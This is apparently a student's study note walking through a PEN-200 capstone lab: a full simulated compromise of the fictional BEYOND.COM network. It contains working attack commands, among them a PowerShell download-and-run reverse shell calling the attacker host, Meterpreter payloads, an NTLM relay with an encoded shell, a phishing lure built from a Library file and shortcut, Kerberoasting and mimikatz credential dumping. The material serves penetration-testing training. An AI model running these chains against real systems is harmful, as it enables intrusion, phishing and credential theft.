# Assembling the Pieces

#ActiveDirectory #WordPress #Phishing #Kerberoasting #NTLMRelay #PrivEsc #Pivoting #PenTest

Part of [[MODULES|PEN200 Modules]]. Module 27 — the capstone walkthrough module. Think of it as Challenge Lab Zero: a full simulated pentest of BEYOND Finances from external recon through to domain admin. No genuinely new techniques here; this module synthesises everything from the course and shows how to chain it together.

**Scenario:** Two external targets — WEBSRV1 (192.168.50.244) and MAILSRV1 (192.168.50.242). Goal: breach the perimeter, get domain admin on BEYOND.COM, access DCSRV1.

> ⚠️ "Kali in Browser" is not supported for this module. Requires the full VPN + dedicated VM group.

---

## Outstanding Sections

- [x] 27.1 — Enumerating the public network
- [x] 27.2 — Attacking a public machine
- [x] 27.3 — Gaining access to the internal network
- [x] 27.4 — Enumerating the internal network
- [x] 27.5 — Attacking an internal web application
- [x] 27.6 — Gaining access to the domain controller
- [x] 27.7 — Wrapping up

> 🚩 Hands-on, VM spin-up required: Full guided walkthrough. Two flags: (1) NTLM hash of BEYOND\Administrator via `lsadump::dcsync /user:beyond\administrator` in mimikatz on DCSRV1 — must be dcsync, NOT SAM extraction; (2) report PDF flag from the linked assessment report. ⬜ Pending

---

## Full Attack Chain

```mermaid
flowchart TD
    A["External recon\nMAILSRV1 + WEBSRV1"] --> B["WPScan on WEBSRV1\nDuplicator 1.3.26 plugin"]
    B --> C["CVE-2020-11738\nDirectory traversal\n/etc/passwd → users: daniela, marcus"]
    C --> D["Retrieve daniela id_rsa\n/home/daniela/.ssh/id_rsa"]
    D --> E["ssh2john + john\n→ passphrase: tequieromucho"]
    E --> F["SSH as daniela\nWEBSRV1 foothold"]
    F --> G["linPEAS\nsudo git NOPASSWD\nwp-config.php: DanielKeyboard3311\n.git repo in /srv/www/wordpress"]
    G --> H["sudo git -p help config\n→ !/bin/bash → root"]
    G --> I["git log / git show\ndeleted commit: fetch_current.sh\njohn:dqsTwTpZPn#nL"]
    I --> J["CrackMapExec SMB spray\n→ beyond.com\\john:dqsTwTpZPn#nL ✓\ndomain = beyond.com"]
    J --> K["swaks phishing to marcus\nLibrary file + LNK shortcut"]
    K --> L["PowerCat reverse shell\nCLIENTWK1 as beyond\\marcus\n172.16.6.243"]
    L --> M["BloodHound/SharpHound\nAD enumeration"]
    M --> N["daniela → kerberoastable\nSPN: http/internalsrv1.beyond.com"]
    M --> O["beccy = Domain Admin\nactive session on MAILSRV1"]
    M --> P["Local Admin session\non INTERNALSRV1"]
    L --> Q["MSF autoroute + SOCKS5\n+ Chisel port forward\nINTERNALSRV1:80 → 127.0.0.1:80"]
    N --> R["impacket-GetUserSPNs\nTGS-REP → hashcat\ndaniela:DANIelaRO123"]
    R --> S["WordPress login\n→ daniela on INTERNALSRV1"]
    S --> T["Backup Migration plugin\nset path to //KaliIP/test"]
    T --> U["impacket-ntlmrelayx\nINTERNALSRV1/ADMIN → MAILSRV1\nSMB signing OFF"]
    U --> V["SYSTEM on MAILSRV1\nvia relayed auth + -c reverse shell"]
    V --> W["mimikatz sekurlsa::logonpasswords\nbeccy NTLM: f0397ec5af49971f6efbdb07877046b3\ncleartext: NiftyTopekaDevolve6655!#!"]
    W --> X["proxychains impacket-psexec\nbeccy hash → DCSRV1 SYSTEM\nDomain Admin ✓"]
```

---

## 27.1 Enumerating the Public Network

### 27.1.1 MAILSRV1

```bash
sudo nmap -sC -sV -oN mailsrv1/nmap 192.168.50.242
```

Key findings: Windows host, IIS 10.0 on port 80 (default welcome page), **hMailServer** on 25/110/143/587, SMB on 135/139/445. No version number for hMailServer — broader CVE search yields nothing actionable. Gobuster finds nothing on the IIS server either.

> 📸 Screenshot: Nmap output showing 8 open ports on MAILSRV1

> 🔍 Worth remembering generally: A mail server with no immediate attack path is still worth fully enumerating. Once you have valid credentials and targets later in the assessment, it becomes your phishing relay.

### 27.1.2 WEBSRV1

```bash
sudo nmap -sC -sV -oN websrv1/nmap 192.168.50.244
```

Findings: Ubuntu 22.04 (SSH banner "OpenSSH 8.9p1 Ubuntu 3" → Launchpad → Jammy Jellyfish), Apache 2.4.52 on port 80, WordPress 6.0.2 (spotted in page source `wp-content`/`wp-includes` strings, confirmed by `whatweb`).

```bash
whatweb http://192.168.50.244
# → WordPress 6.0.2 confirmed

wpscan --url http://192.168.50.244 --enumerate p --plugins-detection aggressive -o websrv1/wpscan
```

Six plugins found: akismet, classic-editor, contact-form-7, **duplicator 1.3.26 (outdated)**, elementor, wordpress-seo.

```bash
searchsploit duplicator
# → CVE-2020-11738: Unauthenticated Arbitrary File Read — version 1.3.26
```

> 📸 Screenshot: wpscan output showing Duplicator 1.3.26 flagged as outdated

**External resources:**
- [HackTricks — WordPress (GitHub)](https://github.com/HackTricks-wiki/hacktricks/blob/master/network-services-pentesting/pentesting-web/wordpress.md)

---

## 27.2 Attacking a Public Machine

### 27.2.1 Initial Foothold (CVE-2020-11738)

The Duplicator plugin's `duplicator_download` AJAX action passes a filename directly into a `../../../../` traversal chain with no sanitisation.

```bash
cd beyond/websrv1
searchsploit -m 50420

# Confirm vuln + grab users
python3 50420.py http://192.168.50.244 /etc/passwd
# → daniela (UID 1001), marcus (UID 1002)

# Try SSH keys
python3 50420.py http://192.168.50.244 /home/marcus/.ssh/id_rsa
# → "Invalid installer file name!!" (no key)

python3 50420.py http://192.168.50.244 /home/daniela/.ssh/id_rsa
# → -----BEGIN OPENSSH PRIVATE KEY----- (success)
```

> 📸 Screenshot: id_rsa returned in terminal

```bash
chmod 600 id_rsa
ssh2john id_rsa > ssh.hash
john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
# → tequieromucho (id_rsa)

ssh -i id_rsa daniela@192.168.50.244
# passphrase: tequieromucho → shell as daniela@websrv1
```

> 🔧 Technique: ssh2john extracts the passphrase-protection hash from an encrypted private key into a format john can crack. If the file is passphrase-protected, `ssh -i` will prompt — throw it at rockyou first before anything else.

🔁 Similar to: [[Common Web Application Attacks#Directory Traversal]], [[Password Attacks#SSH Key Cracking]]

**ippsec.rocks** — search "Duplicator" or "WordPress arbitrary file read" for video walkthroughs of similar CVEs.

### 27.2.2 PrivEsc via sudo git + Git History Creds

**linPEAS:**

```bash
# Kali
cp /usr/share/peass/linpeas/linpeas.sh beyond/websrv1/ && python3 -m http.server 80

# Target
wget http://<KALI>/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh
```

Three findings worth acting on:

1. **sudo NOPASSWD:** `(ALL) NOPASSWD: /usr/bin/git`
2. **WordPress DB creds** in `/srv/www/wordpress/wp-config.php`: `wordpress:DanielKeyboard3311`
3. **Git repo** at `/srv/www/wordpress/.git` (owned root, not world-readable — but accessible via sudo git)

> 📸 Screenshot: linPEAS output — sudo entry and wp-config.php creds highlighted

**Privilege escalation — sudo git pager abuse:**

```bash
sudo git -p help config
# In the pager:
!/bin/bash
# → root@websrv1
whoami  # → root
```

[GTFOBins — git sudo](https://gtfobins.github.io/gtfobins/git/#sudo)

> 🔧 Technique: `git -p` forces output through the pager (usually `less`). Inside `less`, typing `!<cmd>` runs that command as the user who launched the process — here, root. The PAGER environment variable method is often blocked by sudoers `env_reset`; the pager invocation via `-p` is not.

> 📸 Screenshot: whoami → root after !/bin/bash in git pager

**Git history hunting (as root):**

```bash
cd /srv/www/wordpress/
git log
# Two commits: "initial commit" and "Removed staging script and internal network access"

git show 612ff5783cc5dbd1e0e008523dba83374a84aaf1
# diff shows deleted fetch_current.sh:
# sshpass -p "dqsTwTpZPn#nL" rsync john@192.168.50.245:/current_webapp/ /srv/www/wordpress/
```

Creds: `john:dqsTwTpZPn#nL`

> 🔍 Worth remembering generally: Deleted files live forever in git history. Commit messages like "Removed", "cleanup", "fix credentials" are a treasure map. `git show <hash>` shows the exact diff — lines prefixed `-` were removed. This is what gitleaks often misses for non-standard credential formats.

🔁 Similar to: [[Attacking AWS Cloud Infrastructure#26.4.2 Hunting Credentials in Git History]], [[GitHappens]] (HTB)

> 📸 Screenshot: git show diff with sshpass credential line visible

**Creds so far (add to creds.txt):**
- `daniela` — SSH key passphrase: `tequieromucho`
- `wordpress` — DB password: `DanielKeyboard3311`
- `john` — SSH/domain password: `dqsTwTpZPn#nL`

---

## 27.3 Gaining Access to the Internal Network

### 27.3.1 Validating Domain Credentials

```bash
# Password spray collected creds against MAILSRV1
crackmapexec smb 192.168.50.242 -u usernames.txt -p passwords.txt --continue-on-success
# → beyond.com\john:dqsTwTpZPn#nL ✓ (domain also revealed: beyond.com)
# → everything else: STATUS_LOGON_FAILURE

# Check shares as john
crackmapexec smb 192.168.50.242 -u john -p "dqsTwTpZPn#nL" --shares
# → only ADMIN$, C$, IPC$ — no interesting perms
```

> 🔍 Worth remembering generally: `STATUS_LOGON_FAILURE` is ambiguous — it covers both wrong password AND non-existent user. You can't tell which without additional enumeration. Don't assume a user doesn't exist just because every password failed.

🔁 Similar to: [[Password Attacks#CrackMapExec SMB Spraying]]

### 27.3.2 Phishing — Windows Library File + Shortcut

Chosen over Office macros because we have no info about whether Microsoft Office is installed internally. Library + LNK works on any modern Windows without Office.

**Attack flow:** Library file → opens as a "folder" in Explorer → shows our WebDAV share → LNK shortcut inside → clicks it → PowerCat reverse shell fires.

**On Kali (setup):**

```bash
# WebDAV root (serves the .lnk later)
mkdir /home/kali/beyond/webdav
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/beyond/webdav/

# Python server (serves powercat.ps1)
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 beyond/
python3 -m http.server 8000   # in beyond/ directory

# Netcat listener
nc -nvlp 4444
```

**Windows Library file** (`config.Library-ms`, created on WINPREP in VS Code):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <name>@windows.storage.dll,-34582</name>
  <version>6</version>
  <isLibraryPinned>true</isLibraryPinned>
  <iconReference>imageres.dll,-1003</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <isDefaultSaveLocation>true</isDefaultSaveLocation>
      <isSupported>false</isSupported>
      <simpleLocation>
        <url>http://<KALI_IP></url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

**Shortcut command** (right-click Desktop → New → Shortcut on WINPREP, name it `install`):

```
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<KALI>:8000/powercat.ps1'); powercat -c <KALI> -p 4444 -e powershell"
```

Transfer:
- `config.Library-ms` → `/home/kali/beyond/` (attached to email)
- `install.lnk` → `/home/kali/beyond/webdav/` (the WebDAV share root)

**Sending the phishing email via swaks:**

```bash
# body.txt on Kali:
# "Hey! I checked WEBSRV1 and discovered the staging script still exists in the Git logs.
# I'll remove it for security reasons. On an unrelated note, please install the new security
# features on your workstation — download the attached file, double-click it, and execute
# the configuration shortcut within. Thanks! John"

sudo swaks \
  --to daniela@beyond.com,marcus@beyond.com \
  --from john@beyond.com \
  --attach @config.Library-ms \
  --server 192.168.50.242 \
  --body @body.txt \
  --header "Subject: Staging Script" \
  --suppress-data \
  -ap
# Username: john / Password: dqsTwTpZPn#nL
# → daniela: 550 Unknown user (no mailbox)
# → marcus: 250 OK → queued
```

> 🔧 Technique: `550 Unknown user` for daniela tells you she doesn't have a mailbox on hMailServer even though she's a local Linux user on WEBSRV1. The SMTP error leaks which accounts actually exist in the mail system.

> 📸 Screenshot: swaks output — marcus accepted, daniela rejected

A few minutes later, marcus opens the email → double-clicks the Library file → sees the WebDAV share → clicks `install.lnk`:

```
connect to [192.168.119.5] from (UNKNOWN) [192.168.50.242] 64264
PS C:\Windows\System32\WindowsPowerShell\v1.0> whoami
beyond\marcus
hostname → CLIENTWK1
ipconfig → 172.16.6.243/24, gateway 172.16.6.254, DNS 172.16.6.240
```

> 📸 Screenshot: nc listener catching reverse shell as beyond\marcus on CLIENTWK1

**External resources:**
- [PayloadsAllTheThings — Phishing](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Phishing.md)
- [HackTricks — Client-Side Attacks (GitHub)](https://github.com/HackTricks-wiki/hacktricks/blob/master/windows-hardening/av-bypass.md)
- [RevShells](https://www.revshells.com/) — PowerShell one-liners for the shortcut payload

🔁 Similar to: [[Client-Side Attacks#Windows Library Files + WebDAV]]

---

## 27.4 Enumerating the Internal Network

### 27.4.1 Situational Awareness (CLIENTWK1)

```powershell
cd C:\Users\marcus
iwr -uri http://<KALI>:8000/winPEASx64.exe -Outfile winPEAS.exe; .\winPEAS.exe
```

Key winPEAS findings:

- OS shown as "Windows 10 Pro" — **wrong**, always verify with `systeminfo`
  - `systeminfo` → Windows 11 Pro, Build 22000
- No AV detected
- DNS cache: `dcsrv1.beyond.com → 172.16.6.240`, `mailsrv1.beyond.com → 172.16.6.254`

MAILSRV1's internal IP (172.16.6.254) vs. external IP (192.168.50.242) confirms it's dual-homed.

> 🔧 Technique: winPEAS may mis-identify Windows 11 as Windows 10. Always cross-check with `systeminfo` before making any assumptions about kernel exploits or patch levels.

> 🔍 Worth remembering generally: DNS cache on a compromised host maps the internal infrastructure without any active scanning noise. Every cached entry is a machine the victim has recently spoken to.

**BloodHound collection:**

```powershell
iwr -uri http://<KALI>:8000/SharpHound.ps1 -Outfile SharpHound.ps1
powershell -ep bypass
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All
# → creates BloodHound.zip
# Transfer to Kali → BloodHound UI → Upload Data
```

> 📸 Screenshot: BloodHound graph showing all 4 computer nodes

**Custom BloodHound queries:**

```cypher
-- All computers
MATCH (m:Computer) RETURN m

-- All users
MATCH (m:User) RETURN m

-- Active sessions (key query)
MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
```

**Summary of BloodHound findings:**

| Object | Detail |
|--------|--------|
| DCSRV1 | Server 2022, DC, 172.16.6.240 |
| INTERNALSRV1 | Server 2022, 172.16.6.241 |
| MAILSRV1 | Server 2022, dual-homed (external + 172.16.6.254) |
| CLIENTWK1 | Win 11 Pro, 172.16.6.243 |
| Domain Admins | Administrator + **beccy** |
| Sessions | marcus → CLIENTWK1, **beccy → MAILSRV1**, local Admin → INTERNALSRV1 |
| Kerberoastable | **daniela** (SPN: `http/internalsrv1.beyond.com`), krbtgt (skip) |

> 📸 Screenshot: BloodHound showing beccy's active session on MAILSRV1

> 🔍 Worth remembering generally: Always mark owned accounts in BloodHound (right-click → Mark User as Owned). This activates "Shortest Path from Owned Principals" queries that surface attack paths you'd otherwise miss.

Pre-built queries that returned nothing: "Find Workstations where Domain Users can RDP", "Find Servers where Domain Users can RDP", "Find Computers where Domain Users are Local Admin", "Shortest Path to Domain Admins from Owned Principals". No easy low-hanging fruit — need to chain it.

### 27.4.2 Services and Sessions — Internal Network Scan

**Get a Meterpreter session for routing:**

```bash
# Kali
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<KALI> LPORT=443 -f exe -o met.exe

# msfconsole
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <KALI>; set LPORT 443; set ExitOnSession false
run -j
```

```powershell
# CLIENTWK1
iwr -uri http://<KALI>:8000/met.exe -Outfile met.exe; .\met.exe
```

```bash
# msfconsole — after session opens
use multi/manage/autoroute
set session 1; run
# → Route added: 172.16.6.0/255.255.255.0

use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1; set VERSION 5; run -j
# → SOCKS5 on 127.0.0.1:1080

# Verify /etc/proxychains4.conf: socks5 127.0.0.1 1080
```

**CrackMapExec internal sweep:**

```bash
proxychains -q crackmapexec smb 172.16.6.240-241 172.16.6.254 \
  -u john -d beyond.com -p "dqsTwTpZPn#nL" --shares
```

Results: john has no useful share perms. Key SMB signing status:
- DCSRV1: signing **enabled** (can't relay here)
- INTERNALSRV1: signing **disabled** — relay candidate
- MAILSRV1: signing **disabled** — relay candidate

**Nmap via proxychains:**

```bash
# Must use -sT for TCP connect scan through SOCKS — SYN scans don't work via proxychains
sudo proxychains -q nmap -sT -Pn -p 21,80,443 172.16.6.240 172.16.6.241 172.16.6.254
# → INTERNALSRV1: ports 80 and 443 open
# → MAILSRV1: port 80 open
```

> 🔧 Technique: `-sS` (SYN scan) doesn't work through a SOCKS proxy — you must use `-sT` (TCP connect scan) when routing through proxychains. Slower but functional.

**Chisel port forward to browse INTERNALSRV1:**

```bash
# Kali
chmod a+x chisel
./chisel server -p 8080 --reverse

# msfconsole
meterpreter > upload chisel.exe C:\\Users\\marcus\\chisel.exe

# CLIENTWK1 shell
chisel.exe client <KALI>:8080 R:80:172.16.6.241:80
```

Add to Kali `/etc/hosts`: `127.0.0.1  internalsrv1.beyond.com`

Browse to `http://internalsrv1.beyond.com/wp-admin` → WordPress admin login. None of the current creds work yet.

> 🔍 Worth remembering generally: WordPress stores its configured domain name in the DB. If you access via IP or a different hostname it redirects to the stored name. When you see a redirect loop after a port forward, add the domain to `/etc/hosts` pointing to `127.0.0.1`.

🔁 Similar to: [[Port Redirection and SSH Tunneling#Chisel]], [[Lateral Movement in Active Directory#Pivoting via Proxychains]]

---

## 27.5 Attacking an Internal Web Application

### 27.5.1 Kerberoasting Daniela

Daniela's SPN (`http/internalsrv1.beyond.com`) suggests she may be the WordPress admin. Crack her TGS-REP first.

```bash
proxychains -q impacket-GetUserSPNs \
  -request -dc-ip 172.16.6.240 beyond.com/john
# Password: dqsTwTpZPn#nL
# → TGS-REP hash for daniela: $krb5tgs$23$*daniela$BEYOND.COM$...

# Save to daniela.hash
sudo hashcat -m 13100 daniela.hash /usr/share/wordlists/rockyou.txt --force
# → DANIelaRO123
```

> 🔧 Technique: If you get `KRB_AP_ERR_SKEW (Clock skew too great)` — get DC time with `proxychains net time -S 172.16.6.240`, then prefix the command with `faketime 'YYYY-MM-DD HH:MM:SS'`. Large clock skews cause Kerberos to reject tickets entirely.

🔁 Similar to: [[Attacking Active Directory Authentication#Kerberoasting]]

> 📸 Screenshot: hashcat cracked output showing DANIelaRO123

Login to `http://internalsrv1.beyond.com/wp-admin` as `daniela:DANIelaRO123` — success.

**External resources:**
- [HackTricks — Kerberoasting (GitHub)](https://github.com/HackTricks-wiki/hacktricks/blob/master/windows-hardening/active-directory-methodology/kerberoast.md)
- ippsec.rocks → search "Kerberoasting" for boxes where this is the core path
- [[Active]] (HTB) — the classic Kerberoasting box

### 27.5.2 NTLM Relay via WordPress Backup Migration Plugin

**The chain:**
1. WordPress runs as INTERNALSRV1's local Administrator
2. Backup Migration plugin lets you set an arbitrary backup directory path
3. Set path to `//KaliIP/test` → triggers outbound SMB auth from INTERNALSRV1 local Admin
4. Relay that to MAILSRV1 (SMB signing off, same local Admin password)
5. Use relay `-c` to run a PowerShell reverse shell → SYSTEM on MAILSRV1
6. beccy is logged in there → dump creds with Mimikatz

**Setup:**

```bash
# Build base64-encoded PowerShell reverse shell for -c payload
# Use RevShells.com → PowerShell Base64 → LHOST=<KALI> LPORT=9999

# Start ntlmrelayx
sudo impacket-ntlmrelayx \
  --no-http-server \
  -smb2support \
  -t 192.168.50.242 \
  -c "powershell -enc JABjAGwAaQBlAG4AdA..."

# Catch the shell
nc -nvlp 9999
```

**Trigger:** WordPress dashboard → Backup Migration plugin → Manage → Backup directory path → set to `//192.168.119.5/test` → Save.

```
# ntlmrelayx output:
[*] Authenticating against smb://192.168.50.242 as INTERNALSRV1/ADMINISTRATOR SUCCEED
[*] Executed specified command on host: 192.168.50.242

# nc catches:
whoami → nt authority\system
hostname → MAILSRV1
```

> 📸 Screenshot: ntlmrelayx output showing INTERNALSRV1/ADMINISTRATOR relay success to MAILSRV1

> 🔍 Worth remembering generally: Any application feature that triggers an outbound SMB/UNC connection can be abused for NTLM relay when the target has SMB signing off — backup paths, image URLs pointing to internal paths, print spool triggers, etc. The application doesn't have to be vulnerable in the traditional sense; the underlying auth is the target.

> 🔧 Technique: `--no-http-server` in ntlmrelayx disables the HTTP listener (prevents conflicts with other services). `-smb2support` is needed for modern Windows (SMB2+). `-c` runs your command in the context of the relayed user's privileges on the target.

**External resources:**
- [HackTricks — NTLM Relay (GitHub)](https://github.com/HackTricks-wiki/hacktricks/blob/master/windows-hardening/active-directory-methodology/ntlm-relay.md)
- [PayloadsAllTheThings — AD Attack / NTLM Relay](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#ntlm-relay)

🔁 Similar to: [[Lateral Movement in Active Directory#NTLM Relay]]

---

## 27.6 Gaining Access to the Domain Controller

### 27.6.1 Dumping Beccy's Credentials with Mimikatz

Upgrade the netcat shell on MAILSRV1 to Meterpreter first (no AV, so no evasion needed):

```powershell
# MAILSRV1 SYSTEM shell
cd C:\Users\Administrator
iwr -uri http://<KALI>:8000/met.exe -Outfile met.exe; .\met.exe
# → Meterpreter session 2
```

```bash
# msfconsole
sessions -i 2
shell → powershell

iwr -uri http://<KALI>:8000/mimikatz.exe -Outfile mimikatz.exe
.\mimikatz.exe
```

```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords
```

beccy output:
```
* Username : beccy
* Domain   : BEYOND
* NTLM     : f0397ec5af49971f6efbdb07877046b3
* Password : NiftyTopekaDevolve6655!#!
```

> 📸 Screenshot: mimikatz output showing beccy's hash and cleartext password

> 🔍 Worth remembering generally: In a real pentest, don't jump straight to credential dumping after getting SYSTEM. Fully enumerate the machine first — you may find additional creds, sensitive data, or pivot paths that you'll miss if you immediately move on.

🔁 Similar to: [[Lateral Movement in Active Directory#Mimikatz Credential Extraction]]

### 27.6.2 Lateral Movement to DCSRV1

```bash
proxychains -q impacket-psexec \
  -hashes 00000000000000000000000000000000:f0397ec5af49971f6efbdb07877046b3 \
  beccy@172.16.6.240

# whoami → nt authority\system
# hostname → DCSRV1
# ipconfig → 172.16.6.240
```

**Goals achieved:**
- [x] Internal network access (CLIENTWK1 via phishing)
- [x] Domain Administrator privileges (beccy)
- [x] Domain Controller access (DCSRV1)

> 📸 Screenshot: psexec shell on DCSRV1 showing nt authority\system

**For the lab flag:** Run dcsync on DCSRV1 for BEYOND\Administrator's hash:

```
mimikatz # lsadump::dcsync /user:beyond\administrator
```

> 🔧 Technique: The lab specifically requires `lsadump::dcsync`, NOT hash extraction from the SAM file. The two produce different hashes. dcsync replicates the credential from AD directly (requires DC privileges); SAM hashes are the local machine's stored version.

---

## 27.7 Key Takeaways

The module wraps up with five lessons worth internalising before the Challenge Labs:

1. **Thorough enumeration wins.** The git history credential (john) unlocked the entire internal attack chain. If you cut enumeration short to chase the Duplicator CVE, you likely miss it.
2. **Never skip remaining recon after finding something.** The SPN on daniela, beccy's session on MAILSRV1, INTERNALSRV1's running service — each came from enumeration steps done after already having a foothold.
3. **Combine findings across machines.** No single finding was the attack. SMB signing off (CrackMapExec) + backup plugin UNC input (WordPress) + same local Admin password (assumed) + beccy session (BloodHound) = relay chain to domain admin.
4. **Elevate first, then enumerate deeper.** After getting root on WEBSRV1, running linPEAS as root (vs. as daniela) would access previously unreadable files. Apply this principle at every escalation step.
5. **Document from day one.** The `creds.txt` / `computer.txt` structure set up in 27.1 is what lets you cross-reference credentials across systems at each step. In Challenge Labs, a well-structured workspace is the difference between a clue and a dead end.

---

## Related Boxes

**Genuine technique overlap:**
- [[Outdated]] (HTB Windows) — phishing with a Windows Library file + WebDAV leading to an internal pivot; direct match for the 27.3.2 attack
- [[Active]] (HTB Windows) — classic Kerberoasting via SMB share enumeration → TGS-REP cracking → domain admin; direct match for 27.5.1
- [[Return]] (HTB Windows) — abusing a service admin page (printer settings) to point the server at your listener → captures NTLM hash → lateral movement; same conceptual attack as the 27.5.2 Backup Migration plugin abuse
- [[Intelligence]] (HTB Windows) — multi-stage AD chain: credential hunting in PDF documents → Kerberoasting → constrained delegation; mirrors the layered approach throughout 27.4-27.6

**Adjacent workflow:**
- [[Forest]] (HTB Windows) — BloodHound-heavy AD enumeration + WriteDACL path to domain admin; shares the BloodHound methodology from 27.4 but escalates differently
- [[Support]] (HTB Windows) — BloodHound-driven attack chain; different initial vector but the AD enumeration and session hunting phase is nearly identical to 27.4

**Why a single "assembling" box doesn't exist publicly:** This module's value is the *chain*, not any individual technique. No single HTB box replicates the full phishing → Kerberoasting → relay → credential dump → psexec sequence — that's exactly what the Challenge Labs are for.
